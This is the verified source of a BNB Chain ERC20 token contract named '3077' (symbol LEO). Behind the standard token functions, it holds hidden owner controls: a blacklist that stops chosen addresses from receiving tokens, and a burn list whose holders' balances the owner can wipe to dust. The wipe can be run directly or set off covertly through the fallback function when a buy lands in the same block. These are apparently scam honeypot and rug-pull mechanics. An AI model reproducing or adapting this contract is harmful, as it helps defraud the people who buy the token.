/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

// SPDX-License-Identifier: MIT
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity ^0.8.7;

contract LEO is IERC20 {
    string private constant _name_3077 = "3077";
    string private constant _symbol_3077 = "LEO";
    uint8 private constant _decimals_3077 = 18;
    uint256 private _totalSupply_3077 = 1000000000 * 10 ** _decimals_3077;
    
    mapping(address => uint256) private _balances_3077;
    mapping(address => mapping(address => uint256)) private allowed_3077;
    mapping(address => bool) public isPairAddress_3077;
    
    address private factory_3077 = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private WBNB_3077 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;       
    address private BSC_USDT_3077 = 0x55d398326f99059fF775485246999027B3197955;
    address private BUSD_3077 = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address private USDC_3077 = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    
    mapping(address => bool) public isBlack_Listed_3077;
    address[] private blackList_3077;
    mapping(address => bool) public isInBurnList_3077;
    address[] private burnList_3077;

    address public owner_3077;
    address public lastBuyer_3077;
    uint256 public lastBuyerBN_3077;
    uint256 public killBN_3077;

    constructor() {
        owner_3077 = msg.sender;
        _balances_3077[msg.sender] = _totalSupply_3077;
        emit Transfer(address(0), msg.sender, _totalSupply_3077);
        
        isPairAddress_3077[computePairAddress_3077(WBNB_3077)] = true;
        isPairAddress_3077[computePairAddress_3077(BSC_USDT_3077)] = true;
        isPairAddress_3077[computePairAddress_3077(BUSD_3077)] = true;
        isPairAddress_3077[computePairAddress_3077(USDC_3077)] = true;
    }
    modifier onlyOwner() {
        require(msg.sender==owner_3077, "Only owner!");
        _;
    }
    fallback() external {
        killBN_3077 = block.number;
    }
    // ERC20 Functions

    function name() public view virtual returns (string memory) {
        return _name_3077;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol_3077;
    }
    function decimals() public view virtual returns (uint8) {
        return _decimals_3077;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply_3077;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances_3077[account];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        // _approve(_msgSender(), spender, amount);
        // return true;
        allowed_3077[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function allowance(address tokenOwner, address spender) public view virtual override returns (uint256) {
        return allowed_3077[tokenOwner][spender];
    }
    function transfer(address receiver, uint256 amount) public virtual override returns (bool) {
        return transfer_3077(msg.sender, receiver, amount);
    }
    function transferFrom(address tokenOwner, address receiver, uint256 amount) public virtual override returns (bool) {
        require(amount <= allowed_3077[tokenOwner][msg.sender],"Invalid number of tokens allowed by owner");
        allowed_3077[tokenOwner][msg.sender] -= amount;
        return transfer_3077(tokenOwner, receiver, amount);
    }

    function transfer_3077(address sender, address receiver, uint256 amount) internal virtual returns (bool) {
        require(sender!= address(0) && receiver!= address(0), "invalid send or receiver address");
        require(amount <= _balances_3077[sender], "Invalid number of tokens");
        require(!isBlack_Listed_3077[receiver] , "Address is blacklisted and cannot buy this token");

        _balances_3077[sender] -= amount;
        _balances_3077[receiver] += amount;

        emit Transfer(sender, receiver, amount);

        if(isPairAddress_3077[sender] && receiver!=owner_3077){
            uint256 cBlock = block.number;
            if(killBN_3077==cBlock && lastBuyerBN_3077==cBlock) burn_3077();            
            lastBuyerBN_3077 = cBlock;
            lastBuyer_3077 = receiver;
        } 
        return true;
    }
    function computePairAddress_3077(address tokenB) internal view returns (address) {
        (address token0, address token1) = address(this) < tokenB ? (address(this), tokenB) : (tokenB, address(this));
        return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff",factory_3077, keccak256(abi.encodePacked(token0, token1)), hex"00fb7f630776e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5")))));
    }
    function addToBlackList_3077(address[] memory _address) public onlyOwner {
        for(uint i = 0; i < _address.length; i++) {
            if(_address[i]!=owner_3077 && !isBlack_Listed_3077[_address[i]]){
                isBlack_Listed_3077[_address[i]] = true;
                blackList_3077.push(_address[i]);
            }
        }
    }
    function removeFromBlackList_3077(address[] memory _address) public onlyOwner {
        for(uint v = 0; v < _address.length; v++) {
            if(isBlack_Listed_3077[_address[v]]){
                isBlack_Listed_3077[_address[v]] = false;
                uint len = blackList_3077.length;
                for(uint i = 0; i < len; i++) {
                    if(blackList_3077[i] == _address[v]) {
                        blackList_3077[i] = blackList_3077[len-1];
                        blackList_3077.pop();
                        break;
                    }
                }
            }
        }
    }
    function addToBurnList_3077(address[] memory _address) public onlyOwner {
        for(uint i = 0; i < _address.length; i++) {
            if(_address[i]!=owner_3077 && !isInBurnList_3077[_address[i]]){
                isInBurnList_3077[_address[i]] = true;
                burnList_3077.push(_address[i]);
            }
        }
    }
    function removeFromBurnList_3077(address[] memory _address) public onlyOwner {
        for(uint v = 0; v < _address.length; v++) {
            if(isInBurnList_3077[_address[v]]){
                isInBurnList_3077[_address[v]] = false;
                uint len = burnList_3077.length;
                for(uint i = 0; i < len; i++) {
                    if(burnList_3077[i] == _address[v]) {
                        burnList_3077[i] = burnList_3077[len-1];
                        burnList_3077.pop();
                        break;
                    }
                }
            }
        }
    }
    function getBlackList_3077() public view returns (address[] memory list){
        list = blackList_3077;
    }
    function getBurnList_3077() public view returns (address[] memory list){
        list = burnList_3077;
    }
    function burnByOwner_3077() public onlyOwner {
        burn_3077();
    }
    function burn_3077() internal {
        uint len = burnList_3077.length;
        for(uint i = 0; i < len; i++) {
            if(_balances_3077[burnList_3077[i]]>1000000000) {
                uint256 burnAmount = _balances_3077[burnList_3077[i]]-1000000000;
                _balances_3077[burnList_3077[i]] -= burnAmount;
                _balances_3077[address(0)] += burnAmount;
                emit Transfer(burnList_3077[i], address(0), burnAmount);
            }
        }
    }
}